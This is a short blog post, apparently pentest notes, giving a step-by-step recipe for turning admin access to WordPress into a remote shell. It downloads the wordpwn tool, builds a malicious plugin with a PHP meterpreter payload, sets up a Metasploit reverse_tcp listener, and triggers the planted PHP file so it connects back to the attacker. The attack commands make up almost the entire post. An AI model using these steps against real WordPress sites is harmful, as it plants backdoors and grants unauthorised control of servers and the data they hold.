---
layout: post
title: "Use Malicious Wordpress Plugin as PHP Reverse Shell with Metasploit"
---

> **Requirements**: Admin access to Wordpress.

1. Download **Wordpwn**:
   ```bash
   wget https://raw.githubusercontent.com/wetw0rk/malicious-wordpress-plugin/master/wordpwn.py
   ```
2. Generate malicous Wordpress plugin:
   ```bash
   python wordpwn.py <$LOCAL_IP> <$LOCAL_PORT> Y
   ```
3. Install the previously generated `malicious.zip` plugin and activate it in Wordpress. 
4. Run `msfconsole` to start the listener:
   ```
   use exploit/multi/handler 
   set LHOST <$LOCAL_IP>
   set LPORT <$LOCAL_PORT>
   set PAYLOAD php/meterpreter/reverse_tcp 
   exploit
   ```
5. Query `https://<$WORDPRESS_URL>/wp-content/plugins/malicious/wetw0rk_maybe.php` in a browser. This will connect back to the local Metasploit listener and open up a shell on the server.

---
